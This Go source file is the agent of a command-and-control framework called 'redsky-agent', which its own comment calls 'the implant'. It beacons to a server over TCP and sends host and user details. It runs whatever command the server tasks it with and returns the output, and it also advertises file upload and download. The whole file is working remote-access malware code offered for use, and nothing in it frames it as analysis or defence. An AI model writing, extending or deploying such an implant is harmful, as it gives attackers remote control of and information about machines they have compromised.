// redsky-agent — the implant. Phase 1: connect to core over plain TCP,
// beacon, receive one task, run it, send the result. No TLS, no encryption,
// no evasion yet. This is the proof-of-loop.
package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/proto"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

func main() {
	host := flag.String("host", "127.0.0.1", "core host")
	port := flag.Int("port", 4444, "core port")
	interval := flag.Int("interval", 5, "beacon interval seconds")
	tag := flag.String("tag", "", "agent tag (used to derive ID)")
	flag.Parse()

	agentID := *tag
	if agentID == "" {
		agentID = fmt.Sprintf("rs-%08x", rand.Uint32())
	}

	log.Printf("redsky-agent starting id=%s target=%s:%d", agentID, *host, *port)

	for {
		if err := beaconOnce(*host, *port, agentID); err != nil {
			log.Printf("beacon: %v", err)
		}
		time.Sleep(time.Duration(*interval) * time.Second)
	}
}

func beaconOnce(host string, port int, agentID string) error {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 5*time.Second)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()

	info := collectInfo()
	beacon := proto.Beacon{
		AgentID: agentID,
		Info:    info,
		TS:      time.Now().Unix(),
	}
	if err := sendEnvelope(conn, proto.TypeBeacon, beacon); err != nil {
		return fmt.Errorf("send beacon: %w", err)
	}

	// Phase 1: read exactly one task, run it, send result, then close.
	frame, err := wire.ReadFrame(conn)
	if err != nil {
		return fmt.Errorf("read frame: %w", err)
	}
	var env proto.Envelope
	if err := json.Unmarshal(frame.Payload, &env); err != nil {
		return fmt.Errorf("unmarshal envelope: %w", err)
	}

	switch env.Type {
	case proto.TypeTask:
		var task proto.Task
		if err := json.Unmarshal(env.Payload, &task); err != nil {
			return fmt.Errorf("unmarshal task: %w", err)
		}
		result := runTask(task)
		if err := sendEnvelope(conn, proto.TypeResult, result); err != nil {
			return fmt.Errorf("send result: %w", err)
		}
	case proto.TypeSleep:
		var s proto.Sleep
		_ = json.Unmarshal(env.Payload, &s)
		log.Printf("core requested sleep %dms (phase 1 ignores)", s.MS)
	case proto.TypeKill:
		log.Printf("core requested kill, exiting")
		os.Exit(0)
	default:
		log.Printf("unknown message type: %s", env.Type)
	}

	return nil
}

func collectInfo() proto.AgentInfo {
	hostname, _ := os.Hostname()
	usr := "?"
	uid := -1
	if u, err := user.Current(); err == nil {
		usr = u.Username
		fmt.Sscanf(u.Uid, "%d", &uid)
	}
	return proto.AgentInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     usr,
		UID:      uid,
		PID:      os.Getpid(),
		Capabilities: []string{
			"exec",
			"file_get",
			"file_put",
		},
	}
}

func runTask(t proto.Task) proto.Result {
	timeout := time.Duration(t.Timeout) * time.Second
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	cmd := exec.Command(t.Cmd, t.Args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return proto.Result{TaskID: t.ID, Error: err.Error(), ExitCode: -1}
	}
	go func() { done <- cmd.Wait() }()

	select {
	case err := <-done:
		rc := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				rc = ee.ExitCode()
			} else {
				rc = -1
			}
		}
		return proto.Result{
			TaskID:   t.ID,
			Stdout:   stdout.String(),
			Stderr:   stderr.String(),
			ExitCode: rc,
		}
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		return proto.Result{TaskID: t.ID, Error: "timeout", ExitCode: -1}
	}
}

func sendEnvelope(conn net.Conn, t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	return wire.WriteFrame(conn, 0, envBytes)
}
